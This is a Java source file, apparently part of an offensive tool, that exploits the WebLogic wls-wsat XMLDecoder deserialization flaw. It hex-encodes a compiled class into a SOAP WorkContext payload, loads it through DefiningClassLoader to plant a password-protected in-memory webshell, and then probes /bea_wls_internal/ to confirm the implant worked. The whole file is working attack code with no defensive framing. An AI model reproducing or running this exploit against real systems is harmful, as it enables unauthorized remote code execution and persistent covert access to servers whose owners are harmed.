package w01fh4cker.exploit.javabackend.models;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import w01fh4cker.exploit.javabackend.tools.HttpTools;
import w01fh4cker.exploit.javabackend.tools.Response;
import w01fh4cker.exploit.javabackend.tools.getPayload;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;

public class Memshell10271 {
    private static final HashMap<String, String> headers = new HashMap<>();

    public static byte[] toByteArray(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024 * 4];
        int n;
        while ((n = in.read(buffer)) != -1) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    public static String toHexString(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            hexString.append(String.format("%02x", b));
        }
        return hexString.toString();
    }

    public static String getHexString(String className, String newUri, String password) throws NoSuchAlgorithmException, IOException {
        getPayload a = new getPayload();
        a.GetPayload(newUri, password, className);
        InputStream in = Files.newInputStream(Paths.get(className + ".class"));
        byte[] data = toByteArray(in);
        in.close();
        String HexString = toHexString(data);
        try {
            File file = new File(className + "_hex.txt");
            PrintStream ps = new PrintStream(new FileOutputStream(file));
            ps.println(HexString);
        } catch (FileNotFoundException ignored) {}
        return HexString;
    }

    public static void InjectMemshell10271(String url, String className, String newUri, String password) throws NoSuchAlgorithmException, IOException {
        String encoding = "UTF-8";
        headers.put("Content-type", "text/xml");
        String payload = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n         <java>\n    <void class=\"weblogic.utils.Hex\" method=\"fromHexString\" id=\"cls\">\n        <string>0x" + getHexString(className, newUri, password) + "</string>\n    </void>\n    <void class=\"org.mozilla.classfile.DefiningClassLoader\">\n        <void method=\"defineClass\">\n            <string>" + className + "</string>\n            <object idref=\"cls\"></object>\n            <void method=\"newInstance\">\n                <void method=\"main\">\n                    <array class=\"java.lang.String\"></array>\n                </void>\n            </void>\n        </void>\n    </void>\n</java>\n        </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>";
        HttpTools.post(url + "/wls-wsat/CoordinatorPortType11", payload, headers, encoding);
    }

    public static String checkMemshell10271(String url, String newUri, String password) {
        String encoding = "UTF-8";
        Response response = HttpTools.get(url + "/bea_wls_internal/" + newUri, headers, encoding);
        ObjectMapper mapper = new ObjectMapper();
        ObjectNode result = mapper.createObjectNode();
        if (response.getCode() == 200) {
            result.put("status", "success");
            ObjectNode details = mapper.createObjectNode();
            details.put("targetUrl", url);
            details.put("memshellUrl", url + "/bea_wls_internal/" + newUri);
            details.put("memshellPassword", password);
            result.set("details", details);
        } else {
            result.put("status", "failed");
            ObjectNode details = mapper.createObjectNode();
            details.put("targetUrl", url);
            details.put("memshellUrl", url + "/bea_wls_internal/" + newUri);
            details.put("memshellPassword", password);
            result.set("details", details);
        }
        try {
            return mapper.writeValueAsString(result);
        } catch (Exception e) {
            return "{\"error\": \"JSON序列化失败\"}";
        }
    }

}